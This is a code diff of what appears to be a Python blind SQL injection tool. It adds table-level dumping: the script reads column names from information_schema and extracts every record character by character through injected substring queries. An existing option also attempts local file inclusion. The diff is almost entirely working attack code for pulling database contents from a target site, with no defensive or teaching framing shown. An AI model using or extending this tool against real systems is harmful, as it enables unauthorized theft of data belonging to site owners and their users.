@@ -2,6 +2,7 @@
 
 import argparse
 import requests
+from terminaltables import AsciiTable
 
 def main():
 
@@ -34,10 +35,15 @@ def main():
 	if argv['ndbs']:
 		print(f"\n--> {find_n_db()} dbs found")
 	
-	if argv['db']:
+	if argv['db'] and not argv['t']:
 		print(f"Dumping {argv['db']}...")
 
 		dump_db(argv['db'])
+
+	if argv['t'] and argv['db']:
+		print(f"Dumping table {argv['db']}.{argv['t']}...")
+
+		dump_table(argv['db'], argv['t'])
 
 
 def parse_cookies(argv):
@@ -65,6 +71,7 @@ def parse_arguments():
 	dump_group.add_argument('--all-db', help = 'Dump all db', action='store_true')
 	
 	dump_group.add_argument('--db', type=str, help = 'Dump specified db')
+	dump_group.add_argument('--t', type=str, help = 'Dump specified table. Requires db to be specified')
 	dump_group.add_argument('--lfi', metavar='FILE', type=str, help = 'Attempt to dump file')
 
 	return vars(parser.parse_args())
@@ -103,11 +110,31 @@ def dump_db(db_name) -> None:
 	
 	tables = tables.split(",")
 	for table in tables:
-		print(table) 
+		print(f"Dumping {table}...")
+		dump_table(db_name, table) 
 
-def dump_table(table_name, db_name):
-	concat_len = find_query_length(f"select length(group_concat(table_name)) from information_schema.tables where table_schema='{db_name}'")
+def dump_table(db_name, table_name) -> None:
+	concat_len = find_query_length(f"select length(group_concat(column_name)) from information_schema.columns where table_name='{table_name}'")
+	
+	tbl_schema = find_query_string(f"select substring(group_concat(column_name),*,1) from information_schema.columns where table_name='{table_name}'", concat_len)
+	table_dump = dump_columns(tbl_schema, db_name, table_name)
+	print(AsciiTable(table_dump).table)
 
+def dump_columns(columns, db_name, table_name) -> list:
+
+	columns = columns.replace(",", ",':',")
+	tbl_schema = [ columns.split(",':',") ]
+	print(tbl_schema)
+	record_count = find_query_count(f"select count({tbl_schema[0][0]}) from {db_name}.{table_name}")
+	print(f"--> {record_count} records in {db_name}.{table_name}")
+	for i in range(0, record_count):
+		print("--> Dumping record...")
+		query_len = find_query_length(f"select length(concat({columns})) from {db_name}.{table_name} limit {i},1")
+		
+		# Recibimos y parseamos
+		record = find_query_string(f"select substring(concat({columns}),*,1) from {db_name}.{table_name} limit {i},1", query_len)
+		tbl_schema.append(record.split(":"))
+	return tbl_schema
 
 def find_query_count(query):
 	i = 0
@@ -137,7 +164,7 @@ def find_query_length(query):
 	return i - 1
 
 def find_query_string(query, query_len):
-	char = 0
+	char = 32
 	i = 1
 	query_res = []
 
@@ -152,7 +179,7 @@ def find_query_string(query, query_len):
 			query_res.append(chr(char))
 			print(f"\r{''.join(query_res).lower()}", end='')		
 			i += 1
-			char = 0
+			char = 32
 		else:
 			char += 1
 	print("\n")
